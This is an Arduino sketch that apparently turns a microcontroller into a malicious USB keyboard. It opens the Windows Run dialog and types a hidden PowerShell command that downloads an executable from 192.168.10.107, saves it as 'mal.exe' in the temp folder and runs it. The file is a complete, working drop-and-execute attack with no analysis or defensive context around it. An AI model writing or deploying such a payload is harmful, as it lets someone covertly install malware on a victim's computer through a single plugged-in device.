#include<Keyboard.h>
void setup() {
delay(2000);
type(KEY_LEFT_GUI,false);
type('d',false);
Keyboard.releaseAll();
delay(500);
type(KEY_LEFT_GUI,false);
type('r',false);
delay(500);
Keyboard.releaseAll();
delay(1000);
print(F("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.10.107/pay2.exe','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
delay(1000);
type(KEY_RETURN,false);
Keyboard.releaseAll();
Keyboard.end();
}
void type(int key, boolean release) {
	Keyboard.press(key);
	if(release)
		Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
	Keyboard.print(value);
}
void loop(){}
